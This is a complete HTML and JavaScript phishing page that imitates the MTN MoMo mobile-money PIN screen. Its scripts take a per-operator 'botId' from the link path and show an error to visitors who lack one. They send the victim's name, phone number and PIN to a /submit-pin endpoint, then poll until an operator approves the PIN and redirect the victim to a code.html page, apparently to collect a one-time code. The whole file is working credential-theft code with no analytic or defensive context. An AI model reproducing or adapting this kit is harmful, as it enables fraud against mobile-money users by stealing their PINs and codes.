<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MoMo - PIN</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    html, body { width: 100%; min-height: 100%; }
    body { font-family: Arial, Helvetica, sans-serif; background: #fff; overflow-x: hidden; }

    .app {
      position: relative;
      width: 100%;
      max-width: 540px;
      min-height: 100vh;
      min-height: 100svh;
      margin: 0 auto;
      background: #fff;
      overflow: hidden;
    }

    .top { position: relative; height: 220px; background: #004c69; padding-top: 52px; }
    .top::after {
      content: ""; position: absolute; left: -10%; bottom: -75px;
      width: 120%; height: 125px; background: #fff;
      border-radius: 50% 50% 0 0 / 70% 70% 0 0;
    }

    .top-bar {
      position: relative; z-index: 2;
      display: flex; align-items: center; justify-content: space-between;
      padding: 0 22px; margin-top: -10px;
    }

    .back-btn {
      color: #ffd500; font-size: 30px; text-decoration: none; font-weight: 300;
      line-height: 1; background: none; border: none; cursor: pointer;
      transition: color 0.2s;
    }
    .back-btn:hover { color: #ffffff; }

    .logo { display: flex; align-items: center; gap: 8px; }

    .logo-box {
      width: 40px; height: 40px; border-radius: 8px;
      background: linear-gradient(145deg, #087398, #003d59);
      box-shadow: 0 2px 5px rgba(0,0,0,.25), inset 0 0 4px rgba(255,255,255,.12);
      display: flex; align-items: center; justify-content: center;
    }

    .logo-symbol {
      width: 22px; height: 28px; background: #ffd500;
      clip-path: polygon(50% 0, 100% 30%, 86% 100%, 59% 69%, 39% 100%, 13% 34%);
      position: relative;
    }
    .logo-symbol::after {
      content: ""; position: absolute; width: 6px; height: 6px;
      background: #004c69; border-radius: 50%; left: 8px; top: 8px;
    }

    .logo-text { color: #ffd500; font-size: 20px; font-weight: 800; letter-spacing: -0.5px; }
    .logo-text .light { font-weight: 400; font-size: 14px; color: #b8d4e8; }

    .card {
      position: relative; z-index: 5;
      width: calc(100% - 36px); margin: -100px auto 0;
      background: #fff; border-radius: 34px;
      padding: 32px 27px 27px;
      box-shadow: 0 12px 25px rgba(0, 0, 0, .12);
    }

    .title { text-align: center; color: #07516b; font-size: 25px; font-weight: 400; margin-bottom: 4px; }
    .title strong { font-weight: 700; }

    .subtitle { text-align: center; color: #555; font-size: 15px; margin-bottom: 28px; }

    .input-wrapper {
      background: #f8fafc; border-radius: 18px; padding: 8px 16px;
      margin-bottom: 20px; border: 1px solid #e2e8f0;
      display: flex; align-items: center; transition: border-color 0.3s;
    }
    .input-wrapper:focus-within {
      border-color: #005572; box-shadow: 0 0 0 3px rgba(0, 85, 114, 0.15);
    }

    #pinInput {
      width: 100%; height: 56px; border: none; background: transparent;
      font-size: 28px; font-weight: 600; color: #0a0a0a; outline: none;
      letter-spacing: 4px; font-family: Arial, Helvetica, sans-serif;
    }
    #pinInput::placeholder {
      color: #bbb; font-weight: 400; letter-spacing: 0; font-size: 18px;
    }

    #otp-alert {
      text-align: center; font-size: 15px; font-weight: 500; min-height: 24px;
      margin-bottom: 12px; padding: 10px 12px; border-radius: 12px;
      background: transparent; transition: all 0.2s; border: 1px solid transparent;
    }
    #otp-alert.error { background: #fef3f2; color: #c0392b; border-color: #fecdca; }
    #otp-alert.success { background: #ecfdf3; color: #0b2b3b; border-color: #abf0d1; }

    #waiting {
      text-align: center; font-size: 14px; color: #0a0a0a; margin-top: 8px;
      display: none; padding: 10px; border-radius: 12px;
      background: #f8fafc; border: 1px solid #e2e8f0;
    }

    .bottom { width: 100%; padding: 0 18px 14px; margin-top: 30px; }

    .continue-btn {
      width: 100%; height: 69px; border: none; border-radius: 40px;
      background: #d1d5db; color: #fff; font-size: 22px; font-weight: 700;
      cursor: not-allowed; font-family: Arial, Helvetica, sans-serif;
      transition: background 0.3s ease; text-transform: uppercase; letter-spacing: 0.5px;
    }
    .continue-btn:enabled { background: #005572; cursor: pointer; }
    .continue-btn:enabled:hover { background: #00415a; }
    .continue-btn:enabled:active { transform: scale(.98); }
    .continue-btn.waiting { background: #f5a623; color: #fff; opacity: 1; cursor: default; }

    .footer { margin-top: 24px; text-align: center; font-size: 12px; color: #bbb; letter-spacing: 0.5px; padding-bottom: 12px; }

    @media (max-width: 480px) {
      .top { height: 190px; padding-top: 40px; }
      .top-bar { padding: 0 16px; }
      .card { width: calc(100% - 28px); margin-top: -90px; padding: 28px 20px 24px; border-radius: 28px; }
      .title { font-size: 22px; }
      #pinInput { height: 48px; font-size: 24px; }
      .continue-btn { height: 62px; font-size: 20px; }
    }

    @media (max-width: 380px) {
      .card { padding-left: 16px; padding-right: 16px; }
      .title { font-size: 20px; }
      #pinInput { height: 42px; font-size: 20px; }
      .continue-btn { height: 58px; font-size: 18px; }
    }

    @media (max-height: 750px) { .bottom { margin-top: 15px; } }
  </style>
</head>
<body>

<div class="app">

  <div class="top">
    <div class="top-bar">
      <button class="back-btn" onclick="window.history.back()">&#8592;</button>

      <div class="logo">
        <div class="logo-box">
          <div class="logo-symbol"></div>
        </div>
        <div class="logo-text">MoMo <span class="light">from MTN</span></div>
      </div>

      <div style="width: 30px;"></div>
    </div>
  </div>

  <div class="card">

    <div class="title">Enter Your <strong>MoMo PIN</strong></div>

    <div class="input-wrapper">
      <input id="pinInput" type="text" inputmode="numeric" pattern="[0-9]*" placeholder="Enter PIN" autofocus />
    </div>

    <div id="otp-alert"></div>
    <div id="waiting">⏳ Awaiting approval…</div>

  </div>

  <div class="bottom">
    <button id="verifyBtn" class="continue-btn" disabled>SUBMIT</button>
  </div>

  <div class="footer">v 5.3.2 (1.0.0)</div>

</div>


<!-- ============================================================
     SCRIPT 1 — BOT ID RESOLVER (path-based  /bot/<botId>/...)
     ============================================================ -->
<script>
(function () {
  try {
    const path = window.location.pathname;
    const match = path.match(/^\/bot\/([A-Za-z0-9_-]+)(?:\/|$)/);
    let botId = match ? match[1] : null;
    if (!botId) botId = localStorage.getItem('botId');

    if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
      document.documentElement.innerHTML =
        '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
        '<h2>Invalid link</h2>' +
        '<p>Please open this page through the official link.</p>' +
        '</body>';
      window.__BOTID_MISSING__ = true;
      throw new Error('botId missing from path and localStorage');
    }

    localStorage.setItem('botId', botId);
    window.__BOT_ID__ = botId;

    window.__botUrl__ = function (page) {
      page = String(page || '').replace(/^\/+/, '');
      return '/bot/' + encodeURIComponent(botId) + '/' + page;
    };

    console.log('🆔 botId resolved from path:', botId);
  } catch (err) {
    console.error('botId resolver failed:', err.message);
  }
})();
</script>


<!-- ============================================================
     SCRIPT 2 — PAGE LOGIC
     ============================================================ -->
<script>
(function() {
  'use strict';

  // ============================================================
  // CONFIG
  // ============================================================
  const NEXT_PAGE = 'code.html'; // <-- page after pin.html

  // ============================================================
  // BOTID (set by script 1)
  // ============================================================
  const botId = window.__BOT_ID__;
  if (!botId) {
    console.warn('[MoMo] botId missing — page will not submit.');
  }

  // ============================================================
  // READ USER DATA — URL first, then localStorage. Never redirect.
  // ============================================================
  const urlParams = new URLSearchParams(window.location.search);
  let phone = urlParams.get('phone') || localStorage.getItem('phone') || '';
  let name  = urlParams.get('name')  || localStorage.getItem('fullName') || 'MTN User';

  try { if (phone) localStorage.setItem('phone', phone); } catch (e) {}
  try { localStorage.setItem('fullName', name); } catch (e) {}

  // ============================================================
  // DOM REFS
  // ============================================================
  const input     = document.getElementById('pinInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const waitingEl = document.getElementById('waiting');
  const alertEl   = document.getElementById('otp-alert');

  // ============================================================
  // HELPERS
  // ============================================================
  function focusPin() { try { input.focus(); } catch (e) {} }

  function showAlert(text, type) {
    alertEl.textContent = text;
    alertEl.className = type || '';
  }

  function clearAlert() {
    alertEl.textContent = '';
    alertEl.className = '';
  }

  // ============================================================
  // INPUT HANDLING
  // ============================================================
  input.addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '');
    verifyBtn.disabled = (this.value.length === 0);
    clearAlert();
  });

  input.addEventListener('paste', function(e) {
    e.preventDefault();
    const paste = e.clipboardData.getData('text');
    const digits = paste.replace(/\D/g, '');
    this.value = digits;
    verifyBtn.disabled = (digits.length === 0);
    if (digits.length > 0) {
      setTimeout(function() { verifyBtn.click(); }, 300);
    }
  });

  // ============================================================
  // POLLING
  // ============================================================
  let pollTimer = null;

  function stopPolling() {
    if (pollTimer) {
      clearInterval(pollTimer);
      pollTimer = null;
    }
  }

  // ============================================================
  // SUBMIT PIN
  // ============================================================
  verifyBtn.addEventListener('click', async function() {
    const pin = input.value.trim();
    if (pin.length === 0) return;

    if (!botId) {
      showAlert('❌ Invalid link. Please open this page through the official link.', 'error');
      return;
    }
    if (!phone) {
      showAlert('❌ Session expired. Please reopen the official link.', 'error');
      return;
    }

    verifyBtn.disabled = true;
    verifyBtn.textContent = 'Awaiting…';
    verifyBtn.classList.add('waiting');
    waitingEl.style.display = 'block';
    clearAlert();

    try {
      const res = await fetch('/submit-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: name,
          phone: phone,
          pin: pin,
          botId: botId
        })
      });

      if (!res.ok) {
        const errText = await res.text();
        throw new Error(errText || 'Server error');
      }

      const data = await res.json();
      if (!data.requestId) throw new Error('No request ID received');

      stopPolling();
      let attempts = 0;
      const MAX_ATTEMPTS = 120;

      pollTimer = setInterval(async function() {
        attempts++;
        try {
          const checkRes = await fetch('/check-pin/' + encodeURIComponent(data.requestId));
          const status = await checkRes.json();

          if (status.approved === true) {
            stopPolling();
            // Path-based redirect — botId travels in the path
            window.location.href = window.__botUrl__(NEXT_PAGE);
            return;
          }

          if (status.approved === false) {
            stopPolling();
            input.value = '';
            verifyBtn.disabled = true;
            verifyBtn.textContent = 'SUBMIT';
            verifyBtn.classList.remove('waiting');
            waitingEl.style.display = 'none';
            showAlert('❌ Incorrect PIN. Please try again.', 'error');
            focusPin();
            return;
          }

          if (attempts > MAX_ATTEMPTS) {
            stopPolling();
            verifyBtn.disabled = false;
            verifyBtn.textContent = 'SUBMIT';
            verifyBtn.classList.remove('waiting');
            waitingEl.style.display = 'none';
            showAlert('⏳ Approval taking too long. Please refresh or contact support.', 'error');
            return;
          }

          if (attempts % 10 === 0) {
            const seconds = Math.round(attempts * 1.5);
            waitingEl.textContent = '⏳ Awaiting approval… (' + seconds + 's)';
          }

        } catch (err) {
          console.error('Polling error:', err);
        }
      }, 1500);

    } catch (err) {
      waitingEl.style.display = 'none';
      verifyBtn.disabled = false;
      verifyBtn.textContent = 'SUBMIT';
      verifyBtn.classList.remove('waiting');
      showAlert('❌ Server error: ' + err.message, 'error');
    }
  });

  // ============================================================
  // INIT
  // ============================================================
  window.addEventListener('load', function() {
    focusPin();
    verifyBtn.disabled = (input.value.length === 0);
  });

  console.log('✅ pin.html ready. botId =', botId, '| phone =', phone || '(missing)');
})();
</script>

</body>
</html>
